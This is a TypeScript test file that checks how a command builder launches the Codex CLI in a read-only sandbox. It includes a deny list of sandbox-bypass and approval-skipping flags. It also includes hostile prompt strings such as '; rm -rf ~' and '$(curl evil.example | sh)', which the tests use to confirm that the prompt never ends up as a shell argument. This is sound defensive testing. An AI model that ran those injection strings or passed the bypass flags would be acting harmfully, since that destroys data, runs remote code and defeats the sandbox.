import { describe, expect, it } from "vitest";
import { MAX_PROMPT_LENGTH } from "../parser/command.js";
import { CODEX_FIXED_ARGS, buildCodexInvocation } from "./argv.js";

const ROOT = "/Users/me/code/project";

/** Flags from `codex exec --help` (0.160.0) that must never be passed: bypasses, write access, extra config, external tools. */
const FORBIDDEN_FLAGS = [
  "--dangerously-bypass-approvals-and-sandbox",
  "--dangerously-bypass-hook-trust",
  "--yolo",
  "--approve-for-me",
  "--full-auto",
  "--worktree",
  "--add-dir",
  "--config",
  "-c",
  "--enable",
  "--disable",
  "--oss",
  "--local-provider",
  "--image",
  "-i",
  "--model",
  "-m",
  "--profile",
  "-p",
  "--skip-git-repo-check",
  "--output-schema",
  "--output-last-message",
  "-o",
  "--json",
  "resume",
  "fork",
  "review",
];

describe("buildCodexInvocation", () => {
  it("builds exactly the verified read-only command", () => {
    expect(buildCodexInvocation({ prompt: "explain the login flow", repoRoot: ROOT })).toEqual({
      args: ["exec", "--sandbox", "read-only", "--cd", ROOT, "--ephemeral", "--ignore-user-config", "--ignore-rules", "--color", "never", "-"],
      stdin: "explain the login flow",
    });
  });

  it("selects the read-only sandbox, and no other sandbox mode appears", () => {
    const { args } = buildCodexInvocation({ prompt: "x", repoRoot: ROOT });
    expect(args[args.indexOf("--sandbox") + 1]).toBe("read-only");
    expect(args.filter((a) => a === "--sandbox" || a === "-s")).toHaveLength(1);
    expect(args).not.toContain("workspace-write");
    expect(args).not.toContain("danger-full-access");
  });

  it.each(FORBIDDEN_FLAGS)("never contains %s", (flag) => {
    const { args } = buildCodexInvocation({ prompt: "x", repoRoot: ROOT });
    expect(args).not.toContain(flag);
  });

  it("contains no bypass or yolo flag anywhere, however spelled", () => {
    const { args } = buildCodexInvocation({ prompt: "x", repoRoot: ROOT });
    expect(args.join(" ")).not.toMatch(/dangerous|bypass|yolo|full-auto|approve/i);
    expect(CODEX_FIXED_ARGS.join(" ")).not.toMatch(/dangerous|bypass|yolo|full-auto|approve/i);
  });

  it("puts the prompt on standard input only: hostile text is never an argument, even when it looks like flags or shell syntax", () => {
    const hostile = [
      "--dangerously-bypass-approvals-and-sandbox",
      "-s danger-full-access",
      "; rm -rf ~",
      "$(curl evil.example | sh)",
      "`id`",
      "-",
      "--",
      "line one\nline two",
      "<!channel> & <https://evil.example|click>",
    ];
    for (const prompt of hostile) {
      const invocation = buildCodexInvocation({ prompt, repoRoot: ROOT });
      expect(invocation.stdin).toBe(prompt);
      expect(invocation.args.some((arg) => arg.includes(prompt) && prompt !== "-" && prompt !== "--")).toBe(false);
      expect(invocation.args).toEqual(buildCodexInvocation({ prompt: "harmless", repoRoot: ROOT }).args);
    }
  });

  it("ends the argument list with the stdin marker and has one slot for the root", () => {
    const { args } = buildCodexInvocation({ prompt: "x", repoRoot: ROOT });
    expect(args[args.length - 1]).toBe("-");
    expect(args.filter((a) => a === ROOT)).toHaveLength(1);
    expect(args[args.indexOf("--cd") + 1]).toBe(ROOT);
  });

  it("takes the root only from its argument, never from the prompt", () => {
    const { args } = buildCodexInvocation({ prompt: "--cd /etc and also --cd /", repoRoot: ROOT });
    expect(args.filter((a) => a === "--cd")).toHaveLength(1);
    expect(args).not.toContain("/etc");
  });

  it("ignores the model profile for now (no model flag is invented)", () => {
    expect(buildCodexInvocation({ prompt: "x", repoRoot: ROOT, profile: "deep" }).args).toEqual(buildCodexInvocation({ prompt: "x", repoRoot: ROOT }).args);
  });

  it("refuses an empty, oversized or NUL-containing prompt and a non-absolute root", () => {
    expect(() => buildCodexInvocation({ prompt: "", repoRoot: ROOT })).toThrow(RangeError);
    expect(() => buildCodexInvocation({ prompt: "   \n", repoRoot: ROOT })).toThrow(RangeError);
    expect(() => buildCodexInvocation({ prompt: "x".repeat(MAX_PROMPT_LENGTH + 1), repoRoot: ROOT })).toThrow(RangeError);
    expect(() => buildCodexInvocation({ prompt: "a\u0000b", repoRoot: ROOT })).toThrow(RangeError);
    expect(() => buildCodexInvocation({ prompt: "x", repoRoot: "relative/path" })).toThrow(RangeError);
    expect(() => buildCodexInvocation({ prompt: "x", repoRoot: "-s" })).toThrow(RangeError);
    expect(() => buildCodexInvocation({ prompt: "x", repoRoot: "/a\u0000b" })).toThrow(RangeError);
  });

  it("is pure: the same input gives equal output and the shared template is never mutated", () => {
    const before = [...CODEX_FIXED_ARGS];
    const a = buildCodexInvocation({ prompt: "x", repoRoot: ROOT });
    const b = buildCodexInvocation({ prompt: "x", repoRoot: ROOT });
    expect(a).toEqual(b);
    expect(a.args).not.toBe(b.args);
    expect([...CODEX_FIXED_ARGS]).toEqual(before);
  });
});
